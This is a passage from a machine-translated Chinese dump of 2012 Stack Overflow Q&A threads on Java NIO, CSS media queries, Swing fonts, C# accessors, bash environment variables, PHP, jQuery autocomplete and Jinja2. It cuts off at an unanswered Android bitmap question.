                if (key.isAcceptable()) {
                    logger.log(Level.INFO, "handle accept");
                    protocol.handleAccept(key, controller);
                }

                // Client socket channel has pending data?
                if (key.isReadable()) {
                    logger.log(Level.INFO, "handle read");
                    protocol.handleRead(key);
                }

                // Client socket channel is available for writing and
                // key is valid (i.e., channel not closed) ?
                if (key.isValid() && key.isWritable()) {
                    logger.log(Level.INFO, "handle write");
                    protocol.handleWrite(key);
                }
                keyIter.remove(); // remove from set of selected keys
                tries = 0;
            }
        }
    }
} 
```

协议

```
 public class IOProtocol implements Protocol {

    private static final Logger logger = Logger.getLogger(IOProtocol.class.getName());

    IOProtocol() {
        Handler consolehHandler = new ConsoleHandler();
        consolehHandler.setLevel(Level.INFO);
        logger.addHandler(consolehHandler);
    }

    /**
     *
     * @param key
     * @throws IOException
     */
    @Override
    public void handleAccept(SelectionKey key, Controller controller) throws IOException {
        SocketChannel clntChan = ((ServerSocketChannel) key.channel()).accept();
        clntChan.configureBlocking(false); // Must be nonblocking to register
        controller.setCommChannel(clntChan);
        // Register the selector with new channel for read and attach byte buffer
        SelectionKey socketKey = clntChan.register(key.selector(), SelectionKey.OP_READ | SelectionKey.OP_WRITE, controller);
    }

    /**
     * Client socket channel has pending data
     *
     * @param key
     * @throws IOException
     */
    @Override
    public void handleRead(SelectionKey key) throws IOException {
        Controller ctrller = (Controller)key.attachment();
        try {
            ctrller.readData();
        } catch (CommandUnknownException ex) {
            logger.log(Level.SEVERE, null, ex);
        }
        key.interestOps(SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    }

    /**
     * Channel is available for writing, and key is valid (i.e., client channel
     * not closed).
     *
     * @param key
     * @throws IOException
     */
    @Override
    public void handleWrite(SelectionKey key) throws IOException {

        Controller ctrl = (Controller)key.attachment();
        ctrl.writePendingData();
        if (!buf.hasRemaining()) { // Buffer completely written ?
            // Nothing left, so no longer interested in writes
            key.interestOps(SelectionKey.OP_READ);
        }
    buf.compact();
    }
} 
```

控制器

```
 /**
     * Fill buffer with data.
     * @param msg The data to be sent
     * @throws IOException 
     */
    private void writeData(AbstractMsg msg) throws IOException {
//        
        writeBuffer = ByteBuffer.allocate(msg.getSize() + 4);
        writeBuffer.putInt(msg.getSize());
        msg.writeHeader(writeBuffer);
        msg.writeData(writeBuffer);
        logger.log(Level.INFO, "Write data - message size : {0}", new Object[]{msg.getSize()});
        logger.log(Level.INFO, "Write data - message : {0}", new Object[]{msg});
    }

    /**
     * Write to the SocketChannel
     * @throws IOException 
     */
    public void writePendingData() throws IOException {
        commChannel.write(writeBuffer);
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:41:10.787

`ServerSocketChannel`用于建立连接，但不发送数据。每个连接都需要一个`ServerSocketChannel`和一个。`SocketChannel`

读写使用示例`SocketChannel`：

```
ByteBuffer buf = ByteBuffer.allocate(48);
int bytesRead = socketChannel.read(buf); 
```

您的程序将在第二行休眠，直到数据到来。您需要将此代码置于无限循环中并在后台运行`Thread`。当数据到来时，你可以从这个线程处理它，然后等待另一个数据到来。

```
ByteBuffer buf = ByteBuffer.allocate(48);
buf.clear();
buf.put("Hello!".getBytes());

buf.flip();

while(buf.hasRemaining()) {
    channel.write(buf);
} 
```

没有阻塞方法，所以如果你发送小字节缓冲区，你可以从你的 main 调用它`Thread`。

[来源](http://tutorials.jenkov.com/java-nio/socket-channel.html)

**添加：** 不要`OP_WRITE`在新连接上设置密钥。只有`OP_READ`. 当你想写一些数据时，你需要通知选择器你想发送一些东西并在事件循环中发送它。好的解决方案是制作一个`Queue`输出消息。然后按照以下步骤操作：

*   将数据添加到`Queue`
*   设置`OP_WRITE`为频道键
*   在`while (keyIter.hasNext())`循环中，您将拥有`writable key`，从队列中写入所有数据并删除`OP_WRITE`密钥。

我很难理解你的代码，但我想你会发现问题所在。此外，如果您只想拥有一个连接，则无需使用`Selector`. 这很奇怪，你绑定的很少`ServerSocketChannels`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:29:53.720

我建议您使用阻塞 NIO（这是 SocketChannel 的默认行为）您不需要使用 Selector，但您可以使用一个线程进行读取，而使用另一个线程进行写入。

* * *

根据你的例子。

```
private final ByteBuffer writeBuffer = ByteBuffer.allocateDirect(1024*1024);

private void writeData(AbstractMsg msg) {
    writeBuffer.clear();
    writeBuffer.putInt(0); // set later
    msg.writeHeader(writeBuffer);
    msg.writeData(writeBuffer);
    writeBuffer.putInt(0, writeBuffer.position());

    writeBuffer.flip();
    while(writeBuffer.hasRemaining())
        commChannel.write(writeBuffer);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T12:56:51.667

> 什么会在 Selector SelectionKey 上生成和读取或写入事件？

OP_READ：套接字接收缓冲区中存在数据或 EOS。

OP_WRITE：套接字发送缓冲区中的空间。

# javascript - CSS 媒体查询和 JavaScript 窗口宽度不匹配

> ID：11309859
> 
> 赞同：53
> 
> 时间：2012-07-03T11:21:54.490
> 
> 标签：javascript, jquery, media-queries

对于响应式模板，我的 CSS 中有一个媒体查询：

```
@media screen and (max-width: 960px) {
 body{
 /*  something */
 background:red;
 }
} 
```

而且，我做了一个 jQuery 函数来调整日志宽度：

```
$(window).resize(function() {
 console.log($(window).width());
 console.log($(document).width()); /* same result */
 /* something for my js navigation */
} 
```

CSS检测和JS结果有区别，我有这个元：

```
<meta content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width" name="viewport"/> 
```

我想这是由于滚动条（15 px）。我怎样才能做得更好？

* * *

## 回答 #1

> 赞同：72
> 
> 时间：2012-07-03T11:53:51.817

您对滚动条是正确的，这是因为 CSS 使用的是设备宽度，但 JS 使用的是文档宽度。

您需要做的是测量 JS 代码中的视口宽度，而不是使用 jQuery 宽度函数。

此代码来自[http://andylangton.co.uk/articles/javascript/get-viewport-size-javascript/](http://andylangton.co.uk/articles/javascript/get-viewport-size-javascript/)

```
function viewport() {
    var e = window, a = 'inner';
    if (!('innerWidth' in window )) {
        a = 'client';
        e = document.documentElement || document.body;
    }
    return { width : e[ a+'Width' ] , height : e[ a+'Height' ] };
} 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2014-03-04T02:16:00.647

[我在http://www.w3schools.com/js/js_window.asp](http://www.w3schools.com/js/js_window.asp)上找到了以下代码：

```
var w=window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth; 
```

实际上，它的工作方式与@Michael Bird 答案中的答案相同，但更容易阅读。

**编辑：**我正在寻找一种方法来提供与用于 css 媒体查询的宽度完全相同的方法。但是建议的那个在带有滚动条的 Safari 上并不完美，抱歉。我最终在一个中心功能中使用了modernizr.js，在其余代码中我只是检查显示类型是移动设备、平板电脑还是台式机。因为我对宽度不感兴趣，所以这对我来说很好：

```
getDisplayType = function () {
  if (Modernizr.mq('(min-width: 768px)')){
    return 'desktop';
  }
  else if (Modernizr.mq('(min-width: 480px)')){
    return 'tablet'
  }
  return 'mobile';
}; 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2016-05-06T19:47:53.137

window.innerWidth 是您所需要的。

if (window.innerWidth < 768) 适用于 CSS 中的 768 断点

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-04-08T15:59:54.943

始终有效并与 CSS 媒体查询同步的解​​决方法。

将 div 添加到正文

```
<body>
    ...
    <div class='check-media'></div>
    ...
</body> 
```

添加样式并通过输入特定的媒体查询来更改它们

```
.check-media{
    display:none;
    width:0;
}
@media screen and (max-width: 768px) {
    .check-media{
         width:768px;
    }
    ...
} 
```

然后在 JS 中通过输入媒体查询检查您正在更改的样式

```
if($('.check-media').width() == 768){
    console.log('You are in (max-width: 768px)');
}else{
    console.log('You are out of (max-width: 768px)');
} 
```

因此，通常您可以通过输入特定的媒体查询来检查正在更改的任何样式。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-05-23T03:24:08.227

我的经验是媒体查询宽度跟踪 document.body.clientWidth。由于垂直滚动条来来去去，检查文档、窗口或 viewport().width 可能会导致我的 Javascript 延迟运行——在媒体查询规则更改之后，具体取决于窗口的高度。

检查 document.body.clientWidth 允许我的脚本代码在媒体查询规则生效的同时一致地执行。

@media (min-width:873px) `{`
     //一些规则
}
...

if ( document.body.clientWidth >= 873) `{`
    // 一些代码
}

安迪兰顿代码让我明白了这一点——谢谢！

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-01-06T17:26:52.707

嗨，我使用这个小技巧让 JS 和 CSS 在响应式页面上轻松协同工作：

测试在 CSS @media 大小条件下显示或不显示的元素的可见性。使用引导 CSS 我测试 hidden-xs 类元素的可见性

```
var msg = "a message for U";

/* At window load check initial size  */
if ( $('#test-xsmall').is(':hidden')  ) {
  /* This is a CSS Xsmall situation ! */
  msg = "@media CSS < 768px. JS width = " + $(window).width() + " red ! ";
  $('.redthing-on-xsmall').addClass('redthing').html(msg);

} else {
  /* > 768px according to CSS  */
  msg = "@media CSS > 767px. JS width = " + $(window).width() + " not red ! ";
  $('.redthing-on-xsmall').removeClass('redthing').html(msg);
}

/* And again when window resize  */

$(window).on('resize', function() {
  if ($('#test-xsmall').is(':hidden')) {
    msg = "@media CSS < 768px. JS width = " + $(window).width() + " red ! ";
    $('.redthing-on-xsmall').addClass('redthing').html(msg);
  } else {
    msg = "@media CSS > 767px. JS width = " + $(window).width() + " not red ! ";
    $('.redthing-on-xsmall').removeClass('redthing').html(msg);
  }
});
```

```
@media (min-width: 768px) {
  .hidden-xs {
    display: block !important;
  }
}
@media (max-width: 767px) {
  .hidden-xs {
    display: none !important;
  }
}
.redthing-on-xsmall {
  /* need a scrollbar to show window width diff between JS and css */
  min-height: 1500px;
}
.redthing {
  color: red;
}
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>

<!-- the CSS managed Element that is tested by JS --> 
<!-- class hidden-xs hides on xsmall screens (bootstrap) -->

<span id="test-xsmall" class="hidden-xs">THIS ELEMENT IS MANAGED BY CSS  HIDDEN on @media lower than 767px</span>

<!-- the responsive element managed by Jquery  -->
<div class="redthing-on-xsmall">THIS ELEMENT IS MANAGED BY JQUERY RED on @media max width 767px </div>
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-07-05T23:21:46.833

Css 媒体查询等于 window.innerWidth。Css 媒体查询也会计算滚动条。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-12-30T00:11:34.747

执行此操作的简单可靠的方法是使用[媒体查询](https://www.w3schools.com/howto/howto_js_media_queries.asp)。

为了演示，我想检查一下屏幕宽度是否大于等于992px（Bootstrap的大设备）：

```
function isLargeDevice() {
    if (window.matchMedia("(min-width: 992px)").matches) {
        return true;
    } 
    return false;
} 
```

如果你用的是[Modernizer](https://modernizr.com/)那就简单一点，这里我想检查一下屏幕是否小于Bootstrap的大屏（992px）

```
function isSmallerThanLargeScreen() {
    if (Modernizr.mq('(max-width: 991px)')) {
        return true;
    }
    return false;
} 
```

# java - 错误或功能：Win6+ 的 Swing 默认 gui 字体不正确

> ID：11309861
> 
> 赞同：18
> 
> 时间：2012-07-03T11:22:10.640
> 
> 标签：java, swing, windows-7, fonts

只是（令人惊讶地 ;-) 注意到应用程序在我的 win6+ 机器上看起来如此狭窄的原因（对于 Vista 和 Win7 相同，都具有 120dpi 设置，jdk6 和 jdk7）：从桌面属性查找的控制字体都有错误的字体家庭和错误的大小：

```
public static void main(String[] args) {
    Font guiFont = (Font) Toolkit.getDefaultToolkit().getDesktopProperty("win.defaultGUI.font");
    int guiSize = guiFont.getSize();
    Font iconFont = (Font) Toolkit.getDefaultToolkit().getDesktopProperty("win.icon.font");
    System.out.println("gui default: " + guiFont + "\nicon default: " + iconFont);
} 
```

输出：

```
gui default: java.awt.Font[family=Tahoma,name=Tahoma,style=plain,size=13]
icon default: java.awt.Font[family=Segoe UI,name=Segoe UI,style=plain,size=15] 
```

后者在本机应用程序中用于几乎所有文本，而 Swing 使用前者...

问题：

*   这可能有任何原因，还是只是一个错误？
*   谁负责：Swing 查找（从相关系统资源中读取 desktopProperty 时）或操作系统未正确报告？
*   如何强制使用后者？

解决最后一个选项：

*   在完全控制 LAF 的情况下，可能会考虑设置所有相关的文本字体（这就是 JGoodies 所做的，将其纳入 FontPolicy/Set）。
*   一个肮脏的技巧是将 defaultGUI 桌面属性的值设置为正确的值 - 它涉及对工具包的反射访问，这自然会在安全受限的上下文中崩溃。
*   ??

**编辑**

以防万一有人感兴趣，这里是肮脏的黑客：

```
/**
 * Replaces the default gui desktop font property with the icon font
 * if the former is smaller.
 * 
 */
public static void ensureDefaultGUIFontSize() {
    Toolkit toolkit = Toolkit.getDefaultToolkit();
    Font guiFont = (Font) toolkit.getDesktopProperty("win.defaultGUI.font");
    Font iconFont = (Font) toolkit.getDesktopProperty("win.icon.font");
    if (guiFont.getSize() < iconFont.getSize()) {
        invokeDeclaredMethod("setDesktopProperty", Toolkit.class, 
            toolkit, "win.defaultGUI.font", iconFont);
    }
}

private static void invokeDeclaredMethod(String methodName,
        Class<?> clazz, Object instance, String propertyName,
        Object propertyValue) {
    try {
        Method method = clazz.getDeclaredMethod(methodName, String.class, Object.class);
        method.setAccessible(true);
        method.invoke(instance, propertyName, propertyValue);
    } catch (NoSuchMethodException | SecurityException | IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {
        LOG.finer("forcing desktop property failed " + e.getStackTrace());
    }

} 
```

**编辑 2**

澄清一下：该 hack 仅对 WindowsLAF 完全有效。Nimbus 完全忽略系统设置，Metal 部分忽略：后者的字体始终是 Dialog，只有大小取自 desktopProperties。听起来不错，但不是：主要字体的映射相当奇怪，因为大量使用的 controlFont 大小设置为“win.ansiVar.font.height”（那是什么化石剩余？）这是 13在我的机器上...

**编辑 3**

即使在 Windows ui 中，黑客也是......有限制的黑客，fi 那些在@Walter 的评论中提到的：

> 当您缩放 Windows UI 时，此错误尤其明显。仅供参考，打开 JFileChooser 会恢复黑客攻击。此外，JTree/JTable 行高不会自动更新为新的字体大小，您还需要缩放图标

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-03T21:32:00.203

我认为这不是错误，而是 Win7 和内置主题的基本属性，有趣的字体大小，我仍然使用较小的字体（操作系统安装的默认设置）

例如，如果我设置/切换

1.Windows7基本主题

```
gui default: java.awt.Font[family=Tahoma,name=Tahoma,style=plain,size=11]
icon default: java.awt.Font[family=Segoe UI,name=Segoe UI,style=plain,size=12] 
```

2.Windows7经典主题

```
gui default: java.awt.Font[family=Tahoma,name=Tahoma,style=plain,size=11]
icon default: java.awt.Font[family=Tahoma,name=Tahoma,style=plain,size=11]

don't touched the Font property, will be continue for from WinXP 
```

3.WindowXP修改主题

```
gui default: java.awt.Font[family=Tahoma,name=Tahoma,style=plain,size=11]
icon default: java.awt.Font[family=Tahoma,name=Tahoma,style=plain,size=13] 
```

4.Windows7经典主题

```
gui default: java.awt.Font[family=Tahoma,name=Tahoma,style=plain,size=11]
icon default: java.awt.Font[family=Tahoma,name=Tahoma,style=plain,size=11] 
```

# c# - 为什么属性访问器中的访问修饰符应该比属性本身更具限制性？

> ID：11309862
> 
> 赞同：3
> 
> 时间：2012-07-03T11:22:16.217
> 
> 标签：c#

在开发我的应用程序时，我有时会想到我需要一个当前的属性，比如说私有，但也许稍后当我们需要处理新场景时，我们可能需要将它设为公开。但是，即使这会发生，我总是希望二传手保持私密。我想写这样的代码：

```
private int A
{
  get{return _a;}
  private set {_a = value;}
} 
```

编译器抱怨 setter 上的访问修饰符应该比属性更严格。好吧，我需要删除 set 上的访问修饰符，但如果以后我需要将该属性公开，我也会公开它的 setter。

你不认为这是一个警告而不是错误更好吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T11:24:47.013

如果您要更改代码来说，`public`您也可以同时更改代码来说`private set`。

至于这是一个警告，我认为这是有道理的——我认为只有指定`private`两次（尽管显然毫无意义），任何事情都不会失败。也就是说，我很少遇到这个编译器错误，当我遇到这个错误时，我花了 5 秒钟来修复它并继续前进。

[具有讽刺意味的是，我们俩现在在这个问题和答案上花费的时间比我们可能*遇到*的这个错误和它的影响要长:-)]

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T11:29:19.510

> 你不认为这是一个警告而不是错误更好吗？

不，我认为您最好使用私有变量 ( `private int _a;`)，并且仅在需要时将其提升为具有适当修饰符的属性。

当然，如果没有 setter，就不能像这样使用验证：

```
private int _a;
public int A
{
    get { return _a; }
    private set { 

        if (value < 0 || value > 10)
        {
            throw new ArgumentOutOfRangeException("A");
        }

        _a = value; 
    }
} 
```

但另一方面，首先将财产标记为公开并没有什么坏处，不是吗？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-03T11:35:25.213

更改这两个修饰符是完全有效的，所以我不会太在意 privat setter：

```
public int A
{
  get{return _a;}
  private set {_a = value;}
} 
```

这只是我的***猜测***，警告来自编译器将属性重新写入 IL 代码的方式。属性将被编写为每个具有与属性本身相同的修饰符的 getter 和 setter 方法。

如果您现在尝试定义私有属性的私有 setter，这将转化为：

```
private private get_A()
{
   return _a;
} 
```

而这个加倍的私有修饰符显然不会编译。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-03T11:27:46.207

您示例中的代码没有意义。如果您的财产是私有的，那么 setter 也是私有的。您只需要在 setter 上指定访问修饰符，如果 setter 必须有另一个访问修饰符然后是 getter。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-03T11:32:57.823

我认为您想要执行以下操作...

```
private int _a;
public int A
{
    get { return _a; }
    private set { _a = value; }
} 
```

这使得 get 访问器是公开的，但 set 是私有的。

# ruby-on-rails - 在 Ruby on Rails 中动态加载类

> ID：11309865
> 
> 赞同：0
> 
> 时间：2012-07-03T11:22:21.977
> 
> 标签：ruby-on-rails

我有一个`Test`在`lib`文件夹中的类，我想在我的控制器类名的方法中动态地创建这个类的一个对象`class UsersController < ApplicationController`。我怎样才能做到这一点？

就像是

```
class UsersController < ApplicationController  
  def address
    {"here I want to create the object of Test class"}
  end
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:27:01.737

在 Ruby 中，您不能像在 C++ 中那样创建对象，您只能使用`Object::new`方法创建动态对象。`Test`所以要创建你简单的类的实例：

```
test = Test.new 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T12:09:14.303

ruby 中没有编译。如果在 c 的主范围中定义了 Test ，那么它只是一个常量，它可以在任何地方使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T12:26:01.587

Ruby 是解释性语言，因此没有编译阶段。在 config/application.rb 加载 lib 文件夹或文件，因此在启动时它会自动加载这些文件。现在，如果您想要所有方法的测试类实例，只需创建创建实例并在使用方法之前加载的方法`before_filter`

# java - 如何从日期获取日历

> ID：11309868
> 
> 赞同：0
> 
> 时间：2012-07-03T11:22:42.110
> 
> 标签：java

我有一些日期，我想在这个日期之前的最后 x 天得到，所以这是我的代码：

```
 Calendar today = Calendar.getInstance();
            today.add(Calendar.DATE, -x);
            date = new Date(today.getTimeInMillis())) 
```

此代码仅在某一天是实际日期时才有效。我怎么能改变它。有什么方法可以从日期获取日历吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-03T11:24:30.183

使用[setTime](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/Calendar.html#setTime(java.util.Date))方法设置日历的日期：

```
Calendar aDay = Calendar.getInstance();
aDay.setTime(aDate); 
```

# c# - c# asp.net 获取用户名

> ID：11309872
> 
> 赞同：6
> 
> 时间：2012-07-03T11:22:59.143
> 
> 标签：c#, asp.net

“你有没有做过任何 .net 编程？是的？很好，这是一个巨大的损坏程序，修复它”。这就是我所处的情况，如果这是一个简单的问题，很抱歉。

我正在处理的程序从 Web 服务器中提取文件。预计用户已经登录到 Web 服务器。我需要提取当前登录到服务器的用户的用户名（或者只是确保确实有人登录到服务器）。

我尝试了以下方法，它返回一个空字符串。

```
user = HttpContext.Current.User.Identity.Name; 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-03T11:24:49.933

请确保您在 Web.Config 文件中设置 Windows 身份验证。在访问用户名之前还要检查以下内容，

```
HttpContext.Current.User.Identity.IsAuthenticated 
```

如下设置 Web.Config，

```
<authentication mode="Windows"></authentication> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:36:02.883

首先检查**Web.config**文件中的`<authentication>`标记。如果您没有找到它，那么您的应用程序可能没有使用任何标准的身份验证机制。如果是这种情况，请查看`login.aspx`执行身份验证的代码或任何代码。在那里，您将获得登录的用户数据。

我不建议您更改 web.config 文件中的任何内容，而无需牢牢掌握应用程序中的内容。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:30:43.467

对象的属性`User`通常由应用程序的身份验证方案（窗体、Windows 或自定义）填充，因此在开始访问`User`.

有关更多信息，请查看[MSDN 上的文档](http://msdn.microsoft.com/en-us/library/ewfkf772.aspx)。

# bash - Bash 编程传递参数

> ID：11309875
> 
> 赞同：0
> 
> 时间：2012-07-03T11:23:09.540
> 
> 标签：bash

我目前正在学习 bash 编程，但并不真正理解为什么对我来说传递参数不起作用。

我有一个这样的脚本

```
#!/bin/bash
# the following environment variables must be set before running this script
# SIM_DIR name of directory containing armsim
# TEST_DIR name of the directory containing this script and the expected outputs
# LOG_DIR name of the directory that your output is written to by the run_test2 script
# ARMSIM_VERBOSE set to "-v" for verbose logging or leave unset

# First check the environment variables are set
giveup=0
if [[ ${#SIM_DIR} -eq 0 || ${#TEST_DIR} -eq 0 || ${#LOG_DIR} -eq 0 ]] ; then
    echo One or more of the following environment variables must be set:
    echo SIM_DIR, TEST_DIR, LOG_DIR
    giveup=1
fi

# Now check the verbose flag
if [[ ${#ARMSIM_VERBOSE} != 0 && "x${ARMSIM_VERBOSE}" != "x-v" ]] ; then
    echo ARMSIM_VERBOSE must be unset, empty or set to -v
    giveup=1
fi

# Stop if environment is not set up
if [ ${giveup} -eq 1 ] ; then
    exit 0
fi

cd ${TEST_DIR}
for i in test2-*.sh; do
  echo "**** Running test ${i%.sh} *****"
  ./$i > ${LOG_DIR}/${i%.sh}.log
done 
```

当我运行 .sh 文件并传入 3 个示例参数时，如下所示：-

`$ ./run_test2 SIM_DIR TEST_DIR LOG_DIR`

它仍然显示：`One or more of the following environment variables must be set: SIM_DIR, TEST_DIR, LOG_DIR`

有人可以指导我吗？谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:26:41.817

这不是它的预期工作方式。环境变量必须事先在脚本或终端中设置，例如

```
export SIM_DIR=/home/someone/simulations
export TEST_DIR=/home/someone/tests
export LOG_DIR=/home/someone/logs

./run_test2 
```

如果您经常使用这些变量，您可能希望将`export`它们放在`~/.bashrc`. 语法与上`export`例中的 s 相同。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:58:53.417

从我从您的问题/示例中理解的意义上，环境变量并不是真正的论点。听起来你想给函数/脚本提供参数，如果你这样做，你可以在 $1-9 中找到你的参数（我认为 bash 支持更多，不确定），参数的数量存储在 $#

需要两个参数的示例函数：

```
my_func() {
    if [ $# -ne 2 ]; then
        printf "You need to give 2 arguments\n"
        return
    fi

    printf "Your first argument: %s\n" "$1"
    printf "Your second argument: $s\n" "$2"
}

# Call the functionl like this
my_func arg1 arg2 
```

# php - 禁止访问 PHP 文件

> ID：11309876
> 
> 赞同：0
> 
> 时间：2012-07-03T11:23:14.473
> 
> 标签：php, namespaces

在开始使用我拥有的每个脚本之前，我都会进行一些简单的检查，因为所有内容都通过 index.php 文件进行路由，所以我不希望任何人访问这些脚本。我正在检查是否定义了在 index.php 中初始化的全局变量。

```
if (!defined('EXAMPLE')) exit(); 
```

但是现在我在我的代码中引入了命名空间，这不再起作用了。由于命名空间需要在其他所有内容之前编写，因此我需要在定义命名空间之后进行检查。对我来说看起来不太好......这样做可以吗，有没有更好的方法来做到这一点？

# php - Jquery使用PHP和MySQL根据一个字段自动完成两个字段

> ID：11309880
> 
> 赞同：0
> 
> 时间：2012-07-03T11:23:28.217
> 
> 标签：php, javascript, mysql, autocomplete, jquery-autocomplete

我在 MySQL 数据库中有一个表，其中包含以下列：姓名、地址、职业、电话号码和序列号。在我的 html 表单中，在其他字段中，我有用于输入姓名、电话号码和序列号的文本字段。如何使用 jQuery 自动完成和 PHP/MySQL 使用序列号字段填充名称和电话号码字段？我已经设法在一个输入字段上设置自动填充，但我不知道如何设置它以使用具有自动完成功能的一个字段填充其他两个字段。谢谢

这些是领域

```
 <input type="text" name="name" id="autocomplete" />
   <input type="text" name="phone_number" id="autocomplete" />
   <input type="text" name="serial_number" id="autocomplete" /> 
```

这是我从 db 获取字符串的 php 脚本

```
<?php
$dbhost = 'YOUR_SERVER';
$dbuser = 'YOUR_USERNAME';
$dbpass = 'YOUR_PASSWORD';
$dbname = 'YOUR_DATABASE_NAME';

$conn = mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');
mysql_select_db($dbname);

$return_arr = array();

if ($conn)
{
    $fetch = mysql_query("SELECT name, phone_number, serial_number FROM users");

    while ($row = mysql_fetch_array($fetch, MYSQL_ASSOC)) {
        $row_array['value'] = $row['name'] . " " . $row['phone_number'] " . $row['serial_number'] ";         
        array_push($return_arr,$row_array);
    }

}
mysql_close($conn);
echo json_encode($return_arr);
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:28:13.767

您需要做的是，当序列号的自动完成完成后，运行 ajax-call 以根据序列号检索姓名和电话号码，然后填充这些字段，如下所示：

```
$('input[name=serial_number]').autocomplete({
    onComplete: function (val) {
        $.getJSON('/url-to-fetch-name-and-phone.php?serial_number=' + val, function (data) {
            $('input[name=name]').val(data.name);
            $('input[name=tel]').val(data.tel);
        });
    }
}); 
```

显然，您需要根据您的设置更改一些函数和变量名称。

# python - jinja2 + 重构标记

> ID：11309885
> 
> 赞同：5
> 
> 时间：2012-07-03T11:23:57.903
> 
> 标签：python, html, flask, jinja2, restructuredtext

思路如下。我使用类似于 stackoverflow 的标签向 jinja2 发送一些文本。我如何告诉 jinja2 将它们视为包含文本的标记并在 html 中生成粗体、斜体等文本？

谢谢你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T11:31:41.583

我习惯了[django-markdown](http://freewisdom.org/projects/python-markdown/Django)，所以我认为使用过滤器是实现此目的的好方法：

```
 <div class="content">{{ article.body|rst }}</div> 
```

我不知道 jinja2 是否存在这样的过滤器，但[它应该很容易编写](http://jinja.pocoo.org/docs/api/#custom-filters)。我猜这行中的一些东西（未经测试的代码）：

```
from docutils.core import publish_parts
import jinja2

def rst_filter(s):
    return jinja2.Markup(publish_parts(source=s, writer_name='html')['body'])
environment.filters['rst'] = rst_filter 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-03T11:29:24.093

你应该能够做到这一点：

```
from docutils.core import publish_string
import jinja2

html = publish_string(source=text, writer_name='html')
node = jinja2.Markup(html) 
```

Jinja 2 节点实际包含在`node`您的范围中的位置。

# php - 从文本字符串中提取第一个匹配项？

> ID：11309888
> 
> 赞同：1
> 
> 时间：2012-07-03T11:24:20.477
> 
> 标签：php

假设我有以下字符串：

> 你好，我的车是红色的，我的鞋是蓝色的

我想匹配以下单词：

> 蓝色, 红色, 橙色, 紫色

所以它在变量中搜索这 4 个词，并返回第一个词——在我的示例中，返回的词是“红色”。但是如果汽车是蓝色的，那么首先会返回单词 blue，因为它是第一个找到可能匹配列表的单词。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T11:32:27.397

```
$str  = 'hello my car is red and my shoe is blue';
$find = 'blue,red,orange,purple';
$pattern = str_replace(',','|',$find);
preg_match('#'.$pattern.'#i',$str,$match);
echo $match[0]; 
```

如果我正确理解了您的问题。:-)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:35:14.670

区分大小写 ：

```
<?php
$subject = "hello my car is blue and my shoe is blue";                                                                                      
$pattern = '/blue|red|orange|purple/';                                                                                                      
preg_match($pattern, $subject, $matches, PREG_OFFSET_CAPTURE);                                                                              
if (!empty($matches)) {                                                                                                                     
  echo 'Matched `' . $matches[0][0] . '` at index `' . $matches[0][1] . '`';                                                                
} else {                                                                                                                                    
  echo 'Nothing matched';                                                                                                                   
} 
?> 
```

不区分大小写 ：

```
<?php
$subject = "hello my car is blue and my shoe is blue";                                                                                      
$pattern = '/blue|red|orange|purple/';                                                                                                      
preg_match(strtolower($pattern), strtolower($subject), $matches, PREG_OFFSET_CAPTURE);                                                                              
if (!empty($matches)) {                                                                                                                     
  echo 'Matched `' . $matches[0][0] . '` at index `' . $matches[0][1] . '`';                                                                
} else {                                                                                                                                    
  echo 'Nothing matched';                                                                                                                   
} 
?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:38:26.683

```
$string = 'hello my car is red and my shoe is blue';
$words = array ( 'blue', 'red', 'orange', 'purple' );

function checkForWords ( $a, $b ) {

    $pos = 0;
    $first = 0;
    $new_word = '';

    foreach ( $b as $value ) {
        $pos = strpos( $a, $value );

        # First match
        if ( !$first && $pos ) {
            $new_word = $value;
            $first = $pos;          
        }

        # Better match
        if ( $pos && ( $pos < $first ) ) {
            $new_word = $value;
            $first = $pos;
        }
    }
    return $new_word;

}

echo checkForWords ( $string, $words ); 
```

# android - 下载的位图为空

> ID：11309891
> 
> 赞同：0
> 
> 时间：2012-07-03T11:24:32.787
> 
> 标签：android, bitmap, null

我从链接下载了一个 png 文件。但有时没有文件。我有空问题。

如何检查位图是否下载。

```
mIcon = BitmapFactory.decodeStream(icon_url.openConnection() .getInputStream()) 
```

* * *

## 回答 #1

